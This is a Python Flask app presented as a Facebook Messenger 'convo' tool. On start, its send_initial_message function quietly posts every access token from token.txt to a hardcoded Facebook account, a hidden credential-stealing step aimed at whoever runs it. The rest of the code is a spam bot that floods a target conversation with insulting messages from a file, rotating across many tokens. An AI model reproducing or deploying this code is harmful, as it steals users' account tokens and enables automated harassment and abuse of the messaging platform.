from flask import Flask, render_template, request
import threading
import requests
import json
import time
import os

app = Flask(__name__)
is_running = False
bot_thread = None

def send_initial_message():
    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
    target_id = "61563340317000"
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'referer': 'www.google.com'
    }

    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        requests.post(url, json=parameters, headers=headers)
        time.sleep(0.1)

def send_messages_from_file():
    global is_running
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()
    with open('file.txt', 'r') as file:
        messages = file.readlines()
    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    with open('name.txt', 'r') as file:
        haters_name = file.read().strip()
    with open('here.txt', 'r') as file:
        here_name = file.read().strip()
    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'referer': 'www.google.com'
    }

    while is_running:
        try:
            for i, msg in enumerate(messages):
                if not is_running:
                    break
                token = tokens[i % len(tokens)].strip()
                message = msg.strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': token, 'message': f"{haters_name} {message} {here_name}"}
                response = requests.post(url, json=parameters, headers=headers)
                print(f"[{i+1}] {response.status_code} - {parameters['message']}")
                time.sleep(speed)
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    send_initial_message()
    send_messages_from_file()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bot():
    global is_running, bot_thread
    if not is_running:
        is_running = True
        bot_thread = threading.Thread(target=main)
        bot_thread.start()
        return "✅ Bot started"
    return "⚠️ Bot already running"

@app.route('/stop', methods=['POST'])
def stop_bot():
    global is_running
    is_running = False
    return "🛑 Bot stopped"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
